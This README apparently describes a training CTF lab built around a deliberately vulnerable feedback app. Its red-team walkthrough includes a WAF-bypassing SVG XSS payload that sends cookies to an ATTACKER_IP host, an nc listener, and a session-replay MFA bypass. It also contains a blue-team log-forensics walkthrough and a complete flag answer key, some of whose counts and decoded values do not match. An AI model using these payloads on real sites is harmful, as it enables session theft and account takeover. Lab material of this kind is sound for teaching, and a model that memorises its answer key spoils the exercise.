# 🔴🔵 Red vs Blue CTF Lab — Cookies Reuse & MFA Bypass
> Built by Prima Praditya | [linkedin.com/in/primaadit](https://linkedin.com/in/primaadit)

**Cookies Reuse & MFA Bypass Scenario**

> **Scenario:** Internal security audits identified a critical flaw in a corporate "Admin Feedback System." MFA is enforced but session logic is flawed. Red Team exploits via XSS → session replay; Blue Team performs incident response via log forensics.

## 📁 Project Structure

```
ctf-lab/
├── app/
│   ├── Dockerfile
│   ├── package.json
│   ├── index.js              # Express entry point
│   ├── middleware/
│   │   ├── waf.js            # Intentionally weak WAF
│   │   └── auth.js           # Session/cookie auth (vulnerable)
│   └── routes/
│       ├── main.js           # Home, feedback submit
│       ├── api.js            # Login, MFA verify
│       └── dashboard.js      # Protected admin dashboard
├── nginx/
│   ├── Dockerfile
│   └── nginx.conf            # Reverse proxy + access logging
├── scripts/
│   ├── setup.sh              # Proxmox VM provisioning
│   └── inject_logs.py        # Injects mock attack sequence
├── docker-compose.yml
└── README.md
```

## 🚀 Deployment (Proxmox)

### Requirements
- Ubuntu 22.04 LTS VM (2 vCPU, 2GB RAM, 20GB disk)
- Internet access to pull Docker images

### One-Command Deploy
```bash
git clone https://github.com/primaadit/ctf-lab.git
cd ctf-lab
sudo bash scripts/setup.sh
```

### Manual Deploy
```bash
apt-get update && apt-get install -y docker.io docker-compose
useradd -m -s /bin/bash analyst && echo "analyst:blue_team_rocks" | chpasswd
mkdir -p /opt/admin/logs && chmod 777 /opt/admin/logs
echo "127.0.0.1 feedback.admin.local" >> /etc/hosts
docker-compose up -d --build
```

### Service Endpoints

| Service | Address | Credentials |
|---|---|---|
| Web App | `http://feedback.admin.local:3075` | — |
| SSH (Blue Team) | `ssh analyst@<VM_IP> -p 2275` | `blue_team_rocks` |
| Logs | `/opt/admin/logs/` | accessible via SSH |

---

## 🔴 Red Team Walkthrough

### Phase 1: Reconnaissance

```bash
# 1. Identify backend via response header
curl -I http://feedback.admin.local:3075/
# X-Powered-By: Node.js -> SCENARIO75{Node.js}

# 2. Read robots.txt (hinted by ASCII art in page source)
curl http://feedback.admin.local:3075/robots.txt
# Disallow: /api/verify-mfa -> SCENARIO75{/api/verify-mfa}
# Disallow: /dashboard       -> SCENARIO75{/dashboard}
# ASCII art hint in source  -> SCENARIO75{robots.txt}

# 3. Observe initial cookie (HttpOnly=false)
curl -v http://feedback.admin.local:3075/ 2>&1 | grep Set-Cookie
# pre_mfa_session=pending_mfa_verification
# -> SCENARIO75{pre_mfa_session}
# -> SCENARIO75{pending_mfa_verification}
# -> SCENARIO75{False}  (no HttpOnly flag)
```

### Phase 2: WAF Bypass + XSS Cookie Theft

```bash
# 1. Standard XSS gets blocked
curl -X POST http://feedback.admin.local:3075/api/feedback \
  -H "Content-Type: application/json" \
  -d '{"name":"x","message":"<script>alert(1)</script>"}'
# 403 Forbidden -> SCENARIO75{POST}, SCENARIO75{403}

# 2. SVG onload bypass (HTML5 element, WAF doesn't check it)
# SCENARIO75{<svg>}
curl -X POST http://feedback.admin.local:3075/api/feedback \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker","message":"<svg onload=alert(1)>"}'
# 200 OK - bypass confirmed!

# 3. Full exfiltration payload (use in browser)
# Bracket notation bypasses document.cookie block
# SCENARIO75{window['docu'+'ment']['coo'+'kie']}
# SCENARIO75{fetch}
```

XSS payload to inject via feedback form in browser:
```html
<svg onload="fetch('http://ATTACKER_IP:8080/?c='+window['docu'+'ment']['coo'+'kie'])">
```

Catch stolen cookie:
```bash
nc -lvnp 8080
# Receives: pre_mfa_session=pending_mfa_verification
# (and adm_sess if admin is logged in)
```

### Phase 3: MFA Bypass via Session Replay

```bash
# Replay adm_sess cookie - MFA endpoint is completely skipped
# SCENARIO75{adm_sess}
# SCENARIO75{/api/verify-mfa}  <- never called when cookie replayed
curl -b "adm_sess=adm_sess_4dm1n_s3cr3t_t0k3n_2024" \
  http://feedback.admin.local:3075/dashboard

# Dashboard loads with:
# - div class="xss-payload"  -> SCENARIO75{xss-payload}
# - SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}  <- FINAL RED FLAG
```

---

## 🔵 Blue Team Walkthrough

```bash
# SSH in
ssh analyst@<VM_IP> -p 2275  # blue_team_rocks
```

### Phase 1: Log Forensics

```bash
ls /opt/admin/logs/        # SCENARIO75{/opt/admin/logs}

# Identify attacker (non-legitimate) IP
cat /opt/admin/logs/access.log
# 10.10.14.50 = attacker  -> SCENARIO75{10.10.14.50}
# Mozilla/5.0 user agent  -> SCENARIO75{Mozilla/5.0}

# Find successful dashboard access
grep "GET /dashboard" /opt/admin/logs/access.log | grep " 200 "
# 18:51:55 timestamp      -> SCENARIO75{18:51:55}, SCENARIO75{200}

# Find Base64 exfiltration in X-Forwarded-For field
grep "QkxVRV" /opt/admin/logs/access.log
# -> SCENARIO75{QkxVRV9GTEFHe0wwR19IVW50M3JfTTRzdDNyXzB3bjN9}
```

### Phase 2: Threat Hunting

```bash
# Legit traffic baseline
grep "192.168.1.100" /opt/admin/logs/access.log
# -> SCENARIO75{192.168.1.100}

# Attacker subnet: 10.10.14.50 -> SCENARIO75{10.10.14.0/24}

# First WAF block in error.log
grep "WAF_BLOCK" /opt/admin/logs/error.log | head -1
# Timestamp: 18:50:15   -> SCENARIO75{18:50:15}
# Payload: <script>     -> SCENARIO75{<script>}
# File:                 -> SCENARIO75{/opt/admin/logs/error.log}

# Verify attacker never hit /api/verify-mfa
grep "10.10.14.50" /opt/admin/logs/access.log | grep "verify-mfa"
# No results            -> SCENARIO75{No}
```

### Phase 3: Incident Response

```bash
# Decode the Base64 exfiltration string
echo "QkxVRV9GTEFHe0wwR19IVW50M3JfTTRzdDNyXzB3bjN9" | base64 -d
# Encoding type         -> SCENARIO75{Base64}

# Verify 44-char length
echo -n "QkxVRV9GTEFHe0wwR19IVW50M3JfTTRzdDNyXzB3bjN9" | wc -c
# 44                    -> SCENARIO75{44}

# Find CRITICAL cookie reuse events
grep "CRITICAL" /opt/admin/logs/error.log
#                       -> SCENARIO75{CRITICAL}

# Authentication bypass anomaly entry
grep "18:53:10" /opt/admin/logs/error.log
# "Authentication bypass anomaly"  -> SCENARIO75{18:53:10}
#                                  -> SCENARIO75{Authentication bypass anomaly}

# FINAL BLUE FLAG
# -> SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
```

---

## 🏁 Flag Reference

### Red Team (16 flags)
| Flag | Location |
|---|---|
| `SCENARIO75{Node.js}` | X-Powered-By header |
| `SCENARIO75{/api/verify-mfa}` | robots.txt |
| `SCENARIO75{/dashboard}` | robots.txt |
| `SCENARIO75{robots.txt}` | HTML source ASCII art |
| `SCENARIO75{pre_mfa_session}` | Cookie name |
| `SCENARIO75{pending_mfa_verification}` | Cookie value |
| `SCENARIO75{POST}` | Feedback endpoint method |
| `SCENARIO75{403}` | WAF block status code |
| `SCENARIO75{<svg>}` | WAF bypass element |
| `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` | Cookie obfuscation |
| `SCENARIO75{False}` | HttpOnly=false |
| `SCENARIO75{fetch}` | Exfiltration API |
| `SCENARIO75{/api/verify-mfa}` | Skipped during replay |
| `SCENARIO75{adm_sess}` | Admin session prefix |
| `SCENARIO75{xss-payload}` | Dashboard CSS class |
| **`SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`** | **Final flag in dashboard** |

### Blue Team (17 flags)
| Flag | Location |
|---|---|
| `SCENARIO75{/opt/admin/logs}` | Log directory path |
| `SCENARIO75{10.10.14.50}` | Attacker IP in access.log |
| `SCENARIO75{Mozilla/5.0}` | Attacker User-Agent |
| `SCENARIO75{200}` | Dashboard response status |
| `SCENARIO75{18:51:55}` | Dashboard access timestamp |
| `SCENARIO75{QkxVRV9GTEFHe0wwR19IVW50M3JfTTRzdDNyXzB3bjN9}` | X-Forwarded-For field |
| `SCENARIO75{192.168.1.100}` | Legit baseline traffic IP |
| `SCENARIO75{10.10.14.0/24}` | Attacker subnet |
| `SCENARIO75{/opt/admin/logs/error.log}` | Error log path |
| `SCENARIO75{<script>}` | First blocked WAF payload |
| `SCENARIO75{18:50:15}` | First WAF block timestamp |
| `SCENARIO75{No}` | Attacker never hit verify-mfa |
| `SCENARIO75{Base64}` | Exfiltration encoding type |
| `SCENARIO75{44}` | Encoded string length |
| `SCENARIO75{CRITICAL}` | Cookie reuse log level |
| `SCENARIO75{18:53:10}` | Bypass anomaly timestamp |
| `SCENARIO75{Authentication bypass anomaly}` | Anomaly string |
| **`SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`** | **Decoded from Base64** |

---

## 🔧 Troubleshooting

```bash
# Check container status
docker-compose ps

# View webapp logs
docker-compose logs webapp

# Re-inject logs manually
docker-compose run --rm log-injector

# Restart everything
docker-compose down && docker-compose up -d --build
```
